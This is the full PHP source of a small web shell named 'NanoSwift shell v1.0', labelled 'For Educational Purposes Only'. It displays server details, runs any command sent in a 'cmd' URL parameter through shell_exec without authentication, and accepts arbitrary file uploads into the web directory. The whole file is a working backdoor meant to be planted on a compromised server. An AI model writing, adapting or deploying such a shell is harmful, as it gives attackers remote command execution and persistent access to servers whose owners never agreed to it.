<!-- Developed by https://github.com/AhmedShaikh0 -->
<!-- For Educational Purposes Only -->

<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$dir = getcwd();
$uname = php_uname();
$SIP = $_SERVER['SERVER_ADDR'];
$CIP = $_SERVER['REMOTE_ADDR'];
?>

<html>
<div class='basicInfo'>
<center><table style='border:2px solid black; align:center'>
<td>
<p style="font-size:18px; font-family:sans-serif;">
    <b>Server:</b> <?php echo $uname; ?> <br>
    <b>Server IP:</b> <?php echo $SIP; ?> <br>
    <b>Your IP:</b> <?php echo $CIP; ?> <Br>
    <b>Directory:</b> <?php echo $dir; ?> <br>
</p>
</table></center>
</div>

<center><br><a style="font-size:18px; font-family:sans-serif;" href="?upload">Upload File</a></center>
<br><Br>
<center>

<b style="font-size:18px; font-family:sans-serif;">Execute Commands</b>
<div class='cmd'>
<form method='get'> 
    <input type='text' name='cmd'>
    <button name='sub'>Execute</button>
</form>
</div>

<?php 

if(isset($_GET['sub'])){
    $cmd = $_GET['cmd'];
    echo shell_exec($cmd);
}
?>

<br>

 <?php
 if(isset($_GET['upload'])){
    echo '<b style="font-size:18px; font-family:sans-serif;">File Uploader</b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="0"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        $uploaded = $_FILES['file']['name'];
        echo "Upload Success. <a style='font-size:18px; font-family:sans-serif;' target='_blank' href='$uploaded'>Click here to open your file</a>";
    } else {
        echo 'upload failed.';
    }
} else {
    ;
}
 }
?> </center> 
</html>

<footer>
<center><p>&copy; NanoSwift shell v1.0 All rights reserved.</p></center>
</footer>
